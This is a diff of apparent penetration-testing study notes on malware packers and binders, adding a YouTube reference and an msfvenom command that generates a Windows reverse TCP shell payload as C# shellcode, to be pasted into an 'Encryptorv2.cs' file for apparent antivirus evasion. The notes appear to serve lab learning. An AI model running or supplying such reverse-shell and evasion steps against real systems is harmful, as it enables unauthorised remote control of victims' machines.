@@ -63,11 +63,13 @@ To create shellcode with msfvenom, have to use:
   3.) Packers - used to compress and obfuscate executable files. The primary aim is to reduce the file size and/or make the code harder to analyze or reverse engineer. When the packed executable is run, it first unpacks or decompresses itself in memory, and then the original code is executed. UPX (Universal Packer for eXecutables) is a well-known packer. It can be used for both benign and malicious purposes. Are used to deceive analysts.
   4.) Binders - used to combine two or more executables into a single file. When the resulting bound file is executed, all the embedded executables are run, typically one after another. For instance, a benign-looking executable (like a game or utility) might be bound with a piece of malware. 
 
+https://www.youtube.com/watch?v=UIEAYRkO8K4 17:29 msfvenom example 
+ 
+------------
+FROM SCRATCH
 
-
-
-
-
+1.) $ msfvenom LHOST=10.10.182.109 LPORT=4545 -p windows/x64/shell_reverse_tcp -f csharp
+2.) Copy shellcode output and place it in Encryptorv2.cs
 
 
 
